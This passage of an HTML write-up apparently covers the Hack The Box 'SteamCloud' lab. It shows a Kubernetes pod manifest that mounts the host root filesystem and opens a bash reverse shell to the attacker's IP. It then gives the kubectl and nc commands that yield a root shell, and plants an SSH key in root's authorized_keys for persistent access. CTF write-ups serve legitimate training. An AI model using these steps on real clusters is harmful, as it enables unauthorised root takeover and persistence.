+</p><p id="806765d4-04d0-4f70-937f-a9f9a4d37480" class="">Now lets try to get shell, for that make new file of yaml with following configuration</p><pre id="1506188a-bfd7-47ea-ae8b-6a0e8f6b8f29" class="code"><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: 0ez-pod2
+  namespace: default
+spec:
+  containers:
+  - name: 0ez-pod2
+    image: nginx:1.14.2
+    command: [&quot;/bin/bash&quot;]
+    args: [&quot;-c&quot;, &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.38/9999 0&gt;&amp;1&quot;]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true</code></pre><p id="7658b68c-3f18-4c4b-a474-0170d96aae66" class="">after applying this to the pod got the connection</p><pre id="740b0493-4b21-4f23-8b89-d726ec836e9f" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl apply -f ezio.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token 
+pod/0ez-pod2 created
+
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.11.133] 34638
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@steamcloud:/#</code></pre><p id="c136a801-bb32-4daa-af90-e21e79432700" class="">Now time for ssh , With this shell, I’ll create the <code>.ssh</code> folder (if it doesn’t exist from earlier), and write my public key:</p><p id="5c71c790-7778-45e7-9915-d20ef48bd440" class=""><code>root@steamcloud:/# mkdir -p /mnt/root/.ssh</code></p><pre id="68f2414b-833d-4fa8-a6c9-1ec6cc232124" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ nc -lvnp 9999                                                                                                                                                                                                                         1 ⨯
+listening on [any] 9999 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.11.133] 36274
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@steamcloud:/# cd /mnt/root/.ssh
+cd /mnt/root/.ssh
+root@steamcloud:/mnt/root/.ssh# echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOH+il52y3vePDyYbxrHAgfYg+YNdbLj+phL+vmR+8XIF3vlK6lB19sJg+bGa4RnT6FQh9rAOE0FU91y1tKLIk09z3POeM0DDm5Ui+s73FwhiX5Dkb4RqIaOqUFK7WJDpeYOxKeheM4Gv5brySCAhVwyvl17dkcU43R5jZPL214njg8gL/kAsDLWBZFJYbpBBiEWQGg5A9fcBW70/zgosf0jxC9ikNUsu5gvtc5cH9mmqtDXDHOFciESSPuN0r50HfEict4/bXmz5ZWMZ7fY8TtCbRLzTDEnBKknvJW+xm1dyooEpcYEkRbsgB8SkR/XFiROREbtyCN7GCdRoHnfkg1Z0EuflgPqWbb6kWXH42thF/RAXXq43zTwOaYJorjfkbqfR8WwpDM9G2GLWRNk0dWHvq8k6Sacc9a0bhLc82QPLHQIeFbNYNHs6g0l+SMdtbqylnWls2T3q1hz2b4nkL/8FcLvPYuaycBVxwJLCw0pnCjr+Bu8OdghJH/cjEBm+fxbmleXrshCM64qHMg4nJMC6sgX/iR7b+DwlaezPB+8wyp0wBNBVyD4nrHVHStrNcZIu7dkP7R3LFFGNFaqRN5fuVQC+ZngqE9Daa2Fx+7HWBnS/F1yhXuGot3fSc+5xOQ0H7kCnAj4n3JF7GeCXacdRpf2Ftb3blRAvtmZKpKw== ezio@htb&quot; &gt; authorized_keys
+&lt;dRpf2Ftb3blRAvtmZKpKw== ezio@htb&quot; &gt; authorized_keys</code></pre><p id="70af0072-4bb8-4daa-8d26-9c8af6779dfd" class="">Now time to for ssh</p><pre id="d42ffca7-4b1b-4eaa-b7d1-dcc048b0c291" class="code"><code>                                                                                                                                                                                                                                             
+┌──(ezio㉿kali)-[~/.ssh]
+└─$ ssh -i steam.htb root@steamcloud.htb                      
+The authenticity of host &#x27;steamcloud.htb (10.10.11.133)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:/BfbWBuZ6K3xx1f7py/c7eMZ1Wedb7sKF5yhMHNXHZ4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;steamcloud.htb&#x27; (ED25519) to the list of known hosts.
+Linux steamcloud 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jan 10 09:00:00 2022
+root@steamcloud:~#</code></pre><p id="c9479a8e-3260-4f80-b2ee-bed859e9ab1b" class="">
+</p><p id="08a95b69-7370-4d34-b3b9-a528adcc08f6" class="">
+</p><p id="588ff491-23ca-4ad1-90f8-4a96a663c739" class=""><em><a href="index.html"><strong>&lt;&lt;Back To Home</strong></a></em></p><p id="7b6028e5-8dfe-49f3-9ecd-e5d212c0ff88" class="">
+</p></div></article></body></html>
